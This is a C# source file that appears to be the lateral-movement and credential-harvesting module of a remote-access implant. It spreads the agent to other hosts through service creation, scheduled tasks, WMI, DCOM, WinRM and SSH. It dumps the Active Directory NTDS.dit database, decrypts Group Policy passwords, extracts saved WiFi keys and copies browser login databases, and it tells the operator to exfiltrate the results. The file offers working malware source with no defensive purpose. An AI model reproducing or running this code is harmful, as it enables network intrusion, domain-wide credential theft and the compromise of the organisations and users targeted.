// AgentLateral.cs — lateral movement and credential harvesting
// Compiled alongside Agent.cs: mcs Agent.cs AgentLateral.cs Config*.cs -out:agent.exe
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;

// ─── Win32 PInvoke for lateral movement ─────────────────────────────────────

static class Win32Lateral
{
    public const uint LOGON_WITH_PROFILE      = 1;
    public const uint CREATE_NO_WINDOW        = 0x08000000;
    public const uint NORMAL_PRIORITY_CLASS   = 0x00000020;
    public const uint WAIT_INFINITE           = 0xFFFFFFFF;
    public const uint INFINITE                = 0xFFFFFFFF;
    public const uint SC_MANAGER_ALL_ACCESS   = 0xF003F;
    public const uint SERVICE_WIN32_OWN_PROCESS = 0x00000010;
    public const uint SERVICE_ERROR_NORMAL    = 0x00000001;
    public const uint SERVICE_DEMAND_START    = 0x00000003;
    public const uint SERVICE_ALL_ACCESS      = 0xF01FF;
    public const uint GENERIC_READ            = 0x80000000;

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    public struct STARTUPINFO
    {
        public int    cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public int    dwX, dwY, dwXSize, dwYSize;
        public int    dwXCountChars, dwYCountChars;
        public int    dwFillAttribute;
        public int    dwFlags;
        public short  wShowWindow, cbReserved2;
        public IntPtr lpReserved2, hStdInput, hStdOutput, hStdError;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION
    {
        public IntPtr hProcess, hThread;
        public int    dwProcessId, dwThreadId;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct DATA_BLOB
    {
        public int   cbData;
        public IntPtr pbData;
    }

    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    public static extern bool CreateProcessWithLogonW(
        string lpUsername, string lpDomain, string lpPassword,
        uint dwLogonFlags, string lpApplicationName, string lpCommandLine,
        uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory,
        ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hObject);

    [DllImport("crypt32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    public static extern bool CryptUnprotectData(
        ref DATA_BLOB pDataIn, string szDataDescr, IntPtr pOptionalEntropy,
        IntPtr pvReserved, IntPtr pPromptStruct, uint dwFlags,
        ref DATA_BLOB pDataOut);

    [DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
    public static extern IntPtr OpenSCManager(string lpMachineName, string lpDatabaseName, uint dwDesiredAccess);

    [DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
    public static extern IntPtr CreateService(
        IntPtr hSCManager, string lpServiceName, string lpDisplayName,
        uint dwDesiredAccess, uint dwServiceType, uint dwStartType,
        uint dwErrorControl, string lpBinaryPathName,
        string lpLoadOrderGroup, IntPtr lpdwTagId,
        string lpDependencies, string lpServiceStartName, string lpPassword);

    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool StartService(IntPtr hService, int dwNumServiceArgs, string[] lpServiceArgVectors);

    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool DeleteService(IntPtr hService);

    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool CloseServiceHandle(IntPtr hSCObject);
}

// ─── Lateral movement and credential harvesting ───────────────────────────────

static class Lateral
{
    // ── Helper: run a process and capture its output ──────────────────────────

    public static string RunProcess(string file, string args, int timeoutMs = 30000)
    {
        try
        {
            var psi = new ProcessStartInfo(file, args)
            {
                UseShellExecute        = false,
                RedirectStandardOutput = true,
                RedirectStandardError  = true,
                CreateNoWindow         = true,
            };
            using (var p = Process.Start(psi))
            {
                var outSb = new StringBuilder();
                p.OutputDataReceived += (s, e) => { if (e.Data != null) outSb.AppendLine(e.Data); };
                p.ErrorDataReceived  += (s, e) => { if (e.Data != null) outSb.AppendLine(e.Data); };
                p.BeginOutputReadLine();
                p.BeginErrorReadLine();
                p.WaitForExit(timeoutMs);
                return outSb.ToString().TrimEnd();
            }
        }
        catch (Exception ex) { return "[error] " + ex.Message; }
    }

    // ── 1. LATERAL_PSEXEC <host> <cmd> (optionally <user> <pass> prefixed) ───

    public static string PsExec(string args)
    {
        // args: <host> <cmd>
        var parts = args.Split(new[] {' '}, 3, StringSplitOptions.RemoveEmptyEntries);
        if (parts.Length < 2) return "Usage: lateral-psexec <host> <cmd>";
        string host = parts[0];

        try
        {
            string exePath    = System.Reflection.Assembly.GetExecutingAssembly().Location;
            string remotePath = string.Format(@"\\{0}\C$\Windows\Temp\svc_e.exe", host);
            string localPath  = @"C:\Windows\Temp\svc_e.exe";

            File.Copy(exePath, remotePath, true);

            IntPtr hSCM = Win32Lateral.OpenSCManager(host, null, Win32Lateral.SC_MANAGER_ALL_ACCESS);
            if (hSCM == IntPtr.Zero) return "[error] OpenSCManager failed: " + Marshal.GetLastWin32Error();

            IntPtr hSvc = Win32Lateral.CreateService(hSCM, "EndgameSvc", "EndgameSvc",
                Win32Lateral.SERVICE_ALL_ACCESS, Win32Lateral.SERVICE_WIN32_OWN_PROCESS,
                Win32Lateral.SERVICE_DEMAND_START, Win32Lateral.SERVICE_ERROR_NORMAL,
                localPath, null, IntPtr.Zero, null, null, null);

            if (hSvc == IntPtr.Zero)
            {
                Win32Lateral.CloseServiceHandle(hSCM);
                return "[error] CreateService failed: " + Marshal.GetLastWin32Error();
            }

            Win32Lateral.StartService(hSvc, 0, null);
            Thread.Sleep(3000);
            Win32Lateral.DeleteService(hSvc);
            Win32Lateral.CloseServiceHandle(hSvc);
            Win32Lateral.CloseServiceHandle(hSCM);

            try { File.Delete(remotePath); } catch {}
            return string.Format("[+] PsExec-style execution dispatched on {0}", host);
        }
        catch (Exception ex) { return "[error] " + ex.Message; }
    }

    // ── 2. LATERAL_SMBEXEC <host> <cmd> ─────────────────────────────────────

    public static string SmbExec(string args)
    {
        var parts = args.Split(new[] {' '}, 2, StringSplitOptions.RemoveEmptyEntries);
        if (parts.Length < 2) return "Usage: lateral-smbexec <host> <cmd>";
        string host = parts[0];
        string cmd  = parts[1];

        try
        {
            string batRemote = string.Format(@"\\{0}\C$\Windows\Temp\e_exec.bat", host);
            string outRemote = string.Format(@"\\{0}\C$\Windows\Temp\e_out.txt", host);
            string batLocal  = @"C:\Windows\Temp\e_exec.bat";
            string outLocal  = @"C:\Windows\Temp\e_out.txt";

            File.WriteAllText(batRemote, string.Format("@echo off\r\n{0} > {1} 2>&1\r\n", cmd, outLocal));

            IntPtr hSCM = Win32Lateral.OpenSCManager(host, null, Win32Lateral.SC_MANAGER_ALL_ACCESS);
            if (hSCM == IntPtr.Zero) return "[error] OpenSCManager: " + Marshal.GetLastWin32Error();

            string svcBin = string.Format("cmd.exe /c {0}", batLocal);
            IntPtr hSvc = Win32Lateral.CreateService(hSCM, "EndgameExec", "EndgameExec",
                Win32Lateral.SERVICE_ALL_ACCESS, Win32Lateral.SERVICE_WIN32_OWN_PROCESS,
                Win32Lateral.SERVICE_DEMAND_START, Win32Lateral.SERVICE_ERROR_NORMAL,
                svcBin, null, IntPtr.Zero, null, null, null);

            if (hSvc == IntPtr.Zero) { Win32Lateral.CloseServiceHandle(hSCM); return "[error] CreateService: " + Marshal.GetLastWin32Error(); }

            Win32Lateral.StartService(hSvc, 0, null);
            Thread.Sleep(5000);
            Win32Lateral.DeleteService(hSvc);
            Win32Lateral.CloseServiceHandle(hSvc);
            Win32Lateral.CloseServiceHandle(hSCM);

            string output = "";
            try { output = File.ReadAllText(outRemote); File.Delete(outRemote); } catch {}
            try { File.Delete(batRemote); } catch {}
            return string.IsNullOrEmpty(output) ? "[+] SMBExec dispatched on " + host : output;
        }
        catch (Exception ex) { return "[error] " + ex.Message; }
    }

    // ── 3. LATERAL_ATEXEC <host> <cmd> ──────────────────────────────────────

    public static string AtExec(string args)
    {
        var parts = args.Split(new[] {' '}, 2, StringSplitOptions.RemoveEmptyEntries);
        if (parts.Length < 2) return "Usage: lateral-atexec <host> <cmd>";
        string host = parts[0];
        string cmd  = parts[1];

        string outFile = @"C:\Windows\Temp\e_at_out.txt";
        string taskCmd = string.Format("{0} > {1} 2>&1", cmd, outFile);
        string runAt   = DateTime.Now.AddMinutes(1).ToString("HH:mm");

        RunProcess("schtasks.exe", string.Format(
            "/create /S {0} /RU SYSTEM /SC ONCE /ST {1} /TN EndgameAt /TR \"{2}\" /F",
            host, runAt, taskCmd));
        RunProcess("schtasks.exe", string.Format("/run /S {0} /TN EndgameAt", host));
        Thread.Sleep(6000);

        string output = "";
        string outRemote = string.Format(@"\\{0}\C$\Windows\Temp\e_at_out.txt", host);
        try { output = File.ReadAllText(outRemote); File.Delete(outRemote); } catch {}
        RunProcess("schtasks.exe", string.Format("/delete /S {0} /TN EndgameAt /F", host));
        return string.IsNullOrEmpty(output) ? "[+] AtExec dispatched on " + host : output;
    }

    // ── 4. LATERAL_WMI <host> <cmd> ─────────────────────────────────────────

    public static string Wmi(string args)
    {
        var parts = args.Split(new[] {' '}, 2, StringSplitOptions.RemoveEmptyEntries);
        if (parts.Length < 2) return "Usage: lateral-wmi <host> <cmd>";
        string host = parts[0];
        string cmd  = parts[1];
        return RunProcess("wmic.exe", string.Format("/node:{0} process call create \"{1}\"", host, cmd));
    }

    // ── 5. LATERAL_DCOM <host> <cmd> ─────────────────────────────────────────

    public static string Dcom(string args)
    {
        var parts = args.Split(new[] {' '}, 2, StringSplitOptions.RemoveEmptyEntries);
        if (parts.Length < 2) return "Usage: lateral-dcom <host> <cmd>";
        string host = parts[0];
        string cmd  = parts[1];

        try
        {
            Type   appType  = Type.GetTypeFromProgID("MMC20.Application", host);
            object app      = Activator.CreateInstance(appType);
            object document = appType.InvokeMember("Document",    BindingFlags.GetProperty, null, app,      null);
            object view     = document.GetType().InvokeMember("ActiveView", BindingFlags.GetProperty, null, document, null);
            view.GetType().InvokeMember("ExecuteShellCommand", BindingFlags.InvokeMethod, null, view,
                new object[] { "cmd.exe", null, "/c " + cmd, "7" });
            return "[+] DCOM (MMC20.Application) execution dispatched on " + host;
        }
        catch (Exception ex) { return "[error] " + ex.Message; }
    }

    // ── 6. LATERAL_WINRM <host> <cmd> ────────────────────────────────────────

    public static string WinRM(string args)
    {
        var parts = args.Split(new[] {' '}, 2, StringSplitOptions.RemoveEmptyEntries);
        if (parts.Length < 2) return "Usage: lateral-winrm <host> <cmd>";
        return RunProcess("winrs.exe", string.Format("-r:{0} {1}", parts[0], parts[1]));
    }

    // ── 7. LATERAL_SSH <user@host> <cmd> ─────────────────────────────────────

    public static string Ssh(string args)
    {
        var parts = args.Split(new[] {' '}, 2, StringSplitOptions.RemoveEmptyEntries);
        if (parts.Length < 2) return "Usage: lateral-ssh <user@host> <cmd>";
        return RunProcess("ssh.exe", string.Format("-o StrictHostKeyChecking=no {0} \"{1}\"", parts[0], parts[1]));
    }

    // ── 8. LATERAL_RUNAS <domain> <user> <pass> <cmd> ────────────────────────

    public static string RunAs(string args)
    {
        // args: <domain> <user> <pass> <cmd>
        var parts = args.Split(new[] {' '}, 4, StringSplitOptions.RemoveEmptyEntries);
        if (parts.Length < 4) return "Usage: lateral-runas <domain> <user> <pass> <cmd>";

        string domain = parts[0], user = parts[1], pass = parts[2], cmd = parts[3];
        var si = new Win32Lateral.STARTUPINFO { cb = Marshal.SizeOf(typeof(Win32Lateral.STARTUPINFO)) };
        Win32Lateral.PROCESS_INFORMATION pi;

        bool ok = Win32Lateral.CreateProcessWithLogonW(user, domain, pass,
            Win32Lateral.LOGON_WITH_PROFILE, null, "cmd.exe /c " + cmd,
            Win32Lateral.CREATE_NO_WINDOW, IntPtr.Zero, null, ref si, out pi);

        if (!ok) return "[error] CreateProcessWithLogonW: " + Marshal.GetLastWin32Error();
        Win32Lateral.WaitForSingleObject(pi.hProcess, 10000);
        Win32Lateral.CloseHandle(pi.hProcess);
        Win32Lateral.CloseHandle(pi.hThread);
        return string.Format("[+] Spawned as {0}\\{1} (PID {2})", domain, user, pi.dwProcessId);
    }

    // ── 9. ADCS_REQUEST <template> <ca> [<altname>] ──────────────────────────

    public static string AdcsRequest(string args)
    {
        var parts = args.Split(new[] {' '}, 3, StringSplitOptions.RemoveEmptyEntries);
        if (parts.Length < 2) return "Usage: adcs-request <template> <ca\\host> [<altname>]";
        string template = parts[0];
        string ca       = parts[1];
        string altName  = parts.Length > 2 ? parts[2] : "";

        string tmpDir = Path.Combine(Path.GetTempPath(), "adcs_" + Path.GetRandomFileName());
        Directory.CreateDirectory(tmpDir);

        try
        {
            string inf = Path.Combine(tmpDir, "req.inf");
            string csr = Path.Combine(tmpDir, "req.csr");
            string cer = Path.Combine(tmpDir, "req.cer");

            var infContent = new StringBuilder();
            infContent.AppendLine("[Version]");
            infContent.AppendLine("Signature=\"$Windows NT$\"");
            infContent.AppendLine("[NewRequest]");
            infContent.AppendLine("Subject = \"CN=test\"");
            infContent.AppendLine("KeySpec = 1");
            infContent.AppendLine("KeyLength = 2048");
            infContent.AppendLine("Exportable = TRUE");
            infContent.AppendLine("MachineKeySet = FALSE");
            infContent.AppendLine("SMIME = FALSE");
            infContent.AppendLine("PrivateKeyArchive = FALSE");
            infContent.AppendLine("UserProtected = FALSE");
            infContent.AppendLine("UseExistingKeySet = FALSE");
            infContent.AppendLine("ProviderName = \"Microsoft RSA SChannel Cryptographic Provider\"");
            infContent.AppendLine("ProviderType = 12");
            infContent.AppendLine("RequestType = PKCS10");
            infContent.AppendLine("KeyUsage = 0xa0");
            infContent.AppendLine("[RequestAttributes]");
            infContent.AppendLine("CertificateTemplate=" + template);
            if (!string.IsNullOrEmpty(altName))
            {
                infContent.AppendLine("[Extensions]");
                infContent.AppendLine("2.5.29.17 = \"{text}\"");
                infContent.AppendLine("_continue_ = \"upn=" + altName + "&\"");
            }
            File.WriteAllText(inf, infContent.ToString());

            string newOut    = RunProcess("certreq.exe", string.Format("-new \"{0}\" \"{1}\"", inf, csr));
            string submitOut = RunProcess("certreq.exe", string.Format("-submit -config \"{0}\" \"{1}\" \"{2}\"", ca, csr, cer));

            var sb = new StringBuilder();
            sb.AppendLine("=== certreq -new ===");
            sb.AppendLine(newOut);
            sb.AppendLine("=== certreq -submit ===");
            sb.AppendLine(submitOut);

            if (File.Exists(cer))
            {
                byte[] certBytes = File.ReadAllBytes(cer);
                sb.AppendLine("\n=== Certificate (base64) ===");
                sb.AppendLine(Convert.ToBase64String(certBytes));
            }
            return sb.ToString();
        }
        finally
        {
            try { Directory.Delete(tmpDir, true); } catch {}
        }
    }

    // ── 10. DCSYNC [domain] ───────────────────────────────────────────────────

    public static string DcSync(string args)
    {
        string dumpDir = @"C:\Windows\Temp\dc_ifm_" + Path.GetRandomFileName().Replace(".", "");
        var sb = new StringBuilder();

        // Method 1: ntdsutil IFM
        sb.AppendLine("[*] Attempting ntdsutil IFM...");
        string ntdsArgs = string.Format("\"ac i ntds\" \"ifm\" \"create full {0}\" \"quit\" \"quit\"", dumpDir);
        string ntdsOut  = RunProcess("ntdsutil.exe", ntdsArgs, 120000);
        sb.AppendLine(ntdsOut);

        string ntdsFile = Path.Combine(dumpDir, "Active Directory", "ntds.dit");
        if (File.Exists(ntdsFile))
        {
            sb.AppendLine("[+] Success via ntdsutil IFM");
            sb.AppendLine("    ntds.dit : " + ntdsFile);
            sb.AppendLine("    SYSTEM   : " + Path.Combine(dumpDir, "registry", "SYSTEM"));
            sb.AppendLine("[*] Use DOWNLOAD to exfiltrate these files.");
            return sb.ToString();
        }

        // Method 2: VSS shadow copy
        sb.AppendLine("[*] ntdsutil failed, trying vssadmin...");
        string vssOut = RunProcess("vssadmin.exe", "create shadow /for=C:", 60000);
        sb.AppendLine(vssOut);

        var m = Regex.Match(vssOut, @"Shadow Copy Volume Name:\s+(\S+)");
        if (m.Success)
        {
            string shadowVol = m.Groups[1].Value;
            string shadowNtds   = shadowVol + @"\Windows\NTDS\ntds.dit";
            string shadowSystem = shadowVol + @"\Windows\System32\config\SYSTEM";
            string dstNtds      = @"C:\Windows\Temp\ntds.dit";
            string dstSystem    = @"C:\Windows\Temp\SYSTEM";
            try { File.Copy(shadowNtds,   dstNtds,   true); sb.AppendLine("[+] ntds.dit  → " + dstNtds); }   catch (Exception ex) { sb.AppendLine("[-] ntds.dit copy: " + ex.Message); }
            try { File.Copy(shadowSystem, dstSystem, true); sb.AppendLine("[+] SYSTEM    → " + dstSystem); } catch (Exception ex) { sb.AppendLine("[-] SYSTEM copy: " + ex.Message); }
            RunProcess("vssadmin.exe", "delete shadows /shadow=" + shadowVol + " /quiet");
        }
        else
        {
            sb.AppendLine("[-] vssadmin shadow creation failed.");
        }
        return sb.ToString();
    }

    // ── 11a. CRED_GPP — Group Policy Preferences ──────────────────────────────

    // MS published AES-256 key for GPP cpassword
    private static readonly byte[] GppKey = {
        0x4e, 0x99, 0x06, 0xe8, 0xfc, 0xb6, 0x6c, 0xc9, 0xfa, 0xf4, 0x93, 0x10, 0x62, 0x0f, 0xfe, 0xe8,
        0xf4, 0x96, 0xe8, 0x06, 0xcc, 0x05, 0x79, 0x90, 0x20, 0x9b, 0x09, 0xa4, 0x33, 0xb6, 0x6c, 0x1b
    };

    private static string DecryptGppPassword(string cpassword)
    {
        try
        {
            // Add Base64 padding
            int pad = cpassword.Length % 4;
            if (pad != 0) cpassword += new string('=', 4 - pad);
            byte[] data = Convert.FromBase64String(cpassword);

            using (var aes = new AesManaged())
            {
                aes.Key     = GppKey;
                aes.IV      = new byte[16];
                aes.Mode    = CipherMode.CBC;
                aes.Padding = PaddingMode.Zeros;
                using (var dec = aes.CreateDecryptor())
                {
                    byte[] plain = dec.TransformFinalBlock(data, 0, data.Length);
                    // Strip PKCS-zero padding
                    int end = plain.Length;
                    while (end > 0 && plain[end - 1] == 0) end--;
                    return Encoding.Unicode.GetString(plain, 0, end);
                }
            }
        }
        catch { return "(decrypt failed)"; }
    }

    public static string CredGpp(string args)
    {
        // Search SYSVOL or a provided path
        string domain    = args.Trim();
        string sysvolPath = string.IsNullOrEmpty(domain)
            ? string.Format(@"\\{0}\SYSVOL", Environment.GetEnvironmentVariable("USERDNSDOMAIN") ?? "domain.local")
            : string.Format(@"\\{0}\SYSVOL", domain);

        var sb = new StringBuilder();
        sb.AppendLine("[*] Searching for GPP passwords in: " + sysvolPath);

        string[] targets = { "Groups.xml", "ScheduledTasks.xml", "Services.xml", "Datasources.xml", "Printers.xml" };
        try
        {
            foreach (string tgt in targets)
            {
                var files = new List<string>();
                try { files.AddRange(Directory.GetFiles(sysvolPath, tgt, SearchOption.AllDirectories)); } catch {}
                foreach (string f in files)
                {
                    try
                    {
                        string content = File.ReadAllText(f);
                        var matches = Regex.Matches(content, @"cpassword=""([^""]+)""");
                        foreach (Match m in matches)
                        {
                            string enc   = m.Groups[1].Value;
                            string clear = DecryptGppPassword(enc);
                            sb.AppendLine(string.Format("File    : {0}", f));
                            sb.AppendLine(string.Format("Enc pwd : {0}", enc));
                            sb.AppendLine(string.Format("Pwd     : {0}", clear));
                            // Try to extract username from same file
                            var userM = Regex.Match(content, @"userName=""([^""]+)""");
                            if (userM.Success) sb.AppendLine("User    : " + userM.Groups[1].Value);
                            sb.AppendLine();
                        }
                    }
                    catch {}
                }
            }
        }
        catch (Exception ex) { sb.AppendLine("[error] " + ex.Message); }

        return sb.Length < 40 ? "No GPP credentials found." : sb.ToString();
    }

    // ── 11b. CRED_WIFI — WiFi saved passwords ────────────────────────────────

    public static string CredWifi(string args)
    {
        string profilesOut = RunProcess("netsh.exe", "wlan show profiles");
        var profiles = Regex.Matches(profilesOut, @":\s+(.+)$", RegexOptions.Multiline);

        var sb = new StringBuilder();
        sb.AppendLine(string.Format("{0,-35} {1}", "SSID", "Password"));
        sb.AppendLine(new string('-', 70));

        foreach (Match m in profiles)
        {
            string ssid = m.Groups[1].Value.Trim();
            if (string.IsNullOrEmpty(ssid)) continue;
            string detail = RunProcess("netsh.exe", string.Format("wlan show profile name=\"{0}\" key=clear", ssid));
            var keyM = Regex.Match(detail, @"Key Content\s*:\s+(.+)");
            string pw = keyM.Success ? keyM.Groups[1].Value.Trim() : "(no key / open)";
            sb.AppendLine(string.Format("{0,-35} {1}", ssid, pw));
        }
        return sb.ToString();
    }

    // ── 11c. CRED_BROWSER — Chrome/Edge saved credentials (DPAPI) ────────────

    private static string DpapiDecrypt(byte[] encrypted)
    {
        if (encrypted == null || encrypted.Length == 0) return "";
        try
        {
            // Allocate unmanaged memory for input blob
            IntPtr pData = Marshal.AllocHGlobal(encrypted.Length);
            Marshal.Copy(encrypted, 0, pData, encrypted.Length);
            var blobIn  = new Win32Lateral.DATA_BLOB { cbData = encrypted.Length, pbData = pData };
            var blobOut = new Win32Lateral.DATA_BLOB();
            bool ok = Win32Lateral.CryptUnprotectData(ref blobIn, null, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, 0, ref blobOut);
            Marshal.FreeHGlobal(pData);
            if (!ok) return "(dpapi failed)";
            byte[] clear = new byte[blobOut.cbData];
            Marshal.Copy(blobOut.pbData, clear, 0, blobOut.cbData);
            Marshal.FreeHGlobal(blobOut.pbData);
            return Encoding.UTF8.GetString(clear);
        }
        catch { return "(dpapi error)"; }
    }

    private static void HarvestBrowserDb(string label, string dbPath, StringBuilder sb)
    {
        if (!File.Exists(dbPath)) { sb.AppendLine("[-] " + label + " Login Data not found."); return; }
        string tmp = Path.GetTempFileName();
        try
        {
            File.Copy(dbPath, tmp, true);
            // Try sqlite3.exe if available
            string sqlite3 = RunProcess("where.exe", "sqlite3");
            if (!sqlite3.Contains("Could not find") && !sqlite3.StartsWith("[error]"))
            {
                string csv = RunProcess("sqlite3.exe",
                    string.Format("\"{0}\" .separator , \"select origin_url,username_value,password_value from logins\"", tmp));
                foreach (var line in csv.Split('\n'))
                {
                    if (string.IsNullOrWhiteSpace(line)) continue;
                    var cols = line.Split(new[] {','}, 3);
                    if (cols.Length < 3) continue;
                    // password_value is hex-encoded by sqlite3 CLI when BLOB
                    string url  = cols[0].Trim();
                    string user = cols[1].Trim();
                    string pw   = "(encrypted blob — use manual extraction)";
                    sb.AppendLine(string.Format("[{0}] {1} | {2} | {3}", label, url, user, pw));
                }
            }
            else
            {
                // Manual SQLite page parsing — read records containing "origin_url" patterns
                byte[] raw = File.ReadAllBytes(tmp);
                sb.AppendLine(string.Format("[{0}] DB size: {1} bytes — parsing raw pages", label, raw.Length));
                // Find UTF-8 strings that look like URLs
                string rawStr = Encoding.UTF8.GetString(raw).Replace("\0", " ");
                var urlMatches = Regex.Matches(rawStr, @"https?://[^\x00-\x1f\s]{5,120}");
                var seen = new HashSet<string>();
                int count = 0;
                foreach (Match m in urlMatches)
                {
                    string url = m.Value.TrimEnd(',', '.', ';');
                    if (seen.Add(url)) { sb.AppendLine("  URL: " + url); if (++count >= 30) break; }
                }
                sb.AppendLine(string.Format("  (passwords are DPAPI-encrypted — exfil Login Data for offline decryption)"));
            }
        }
        catch (Exception ex) { sb.AppendLine("[error] " + ex.Message); }
        finally { try { File.Delete(tmp); } catch {} }
    }

    public static string CredBrowser(string args)
    {
        var sb   = new StringBuilder();
        string lad = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
        string[] dbs = {
            Path.Combine(lad, @"Google\Chrome\User Data\Default\Login Data"),
            Path.Combine(lad, @"Microsoft\Edge\User Data\Default\Login Data"),
            Path.Combine(lad, @"BraveSoftware\Brave-Browser\User Data\Default\Login Data"),
        };
        string[] labels = { "Chrome", "Edge", "Brave" };
        for (int i = 0; i < dbs.Length; i++) HarvestBrowserDb(labels[i], dbs[i], sb);
        return sb.ToString();
    }

    // ── 11d. CRED_NTDS — NTDS.dit via ntdsutil ────────────────────────────────

    public static string CredNtds(string args)
    {
        string dumpDir = @"C:\Windows\Temp\ntds_" + Path.GetRandomFileName().Replace(".", "");
        string cmd = string.Format("\"ac i ntds\" \"ifm\" \"create full {0}\" \"quit\" \"quit\"", dumpDir);
        string output = RunProcess("ntdsutil.exe", cmd, 120000);

        var sb = new StringBuilder();
        sb.AppendLine(output);

        string ntds   = Path.Combine(dumpDir, "Active Directory", "ntds.dit");
        string system = Path.Combine(dumpDir, "registry", "SYSTEM");

        if (File.Exists(ntds))
        {
            sb.AppendLine("[+] ntds.dit  : " + ntds);
            sb.AppendLine("[+] SYSTEM    : " + system);
            sb.AppendLine("[*] Exfiltrate with DOWNLOAD command, then run secretsdump offline:");
            sb.AppendLine("    impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL");
        }
        else
        {
            sb.AppendLine("[-] ntdsutil IFM failed. Try DCSYNC or ensure you are on a DC with admin rights.");
        }
        return sb.ToString();
    }
}
